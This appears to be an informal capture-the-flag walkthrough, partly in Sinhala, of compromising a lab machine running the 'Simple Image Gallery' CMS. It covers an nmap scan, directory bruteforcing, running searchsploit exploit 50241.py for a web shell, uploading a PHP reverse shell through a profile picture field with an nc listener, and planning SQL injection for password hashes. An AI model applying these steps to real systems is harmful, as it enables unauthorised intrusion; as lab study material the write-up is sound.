first run nmap

there are 2 ports open

so i test the website

then performed a directory bruteforcing
find this path 👇
- gallery/login.php

it is a cms called "simple image gallery"
so it had some vulnerability to sql injection and remote code extention

## first style (RCE)
so first i tried the searchsploit exploit

- searchsploit simple image gallery

- searchsploit -x 50241.py   👈 for cat the exploit file 

- searchsplpoit -m 50241.py 👈 for download the exploit file

exploit එක run කරන්න 

python3 50241.py

එතකොට attacking site එක ඉල්ලනව.
- 10.123.13.14/gallery

now you have a web shell 

## 2nd style (RCE)

web site  එකෙ backend එක php නිසා php reverse shell එක ,website එකෙ profile picture upload කරන්න තියෙන තැනට upload කරන්න .

nc -nvlp 1234

👆 අපි netcat listen කරගෙන ඉන්නත් ඕනෙ.

now we got a shell ; but we cant use sudo

### ❤️❤️ Right Method ❤️❤️

මෙතනදි අපිට user passsword hash එක ඉල්ලන නිසා sql attack එකක් කරල බලන්න ඕනෙ server side එකට .

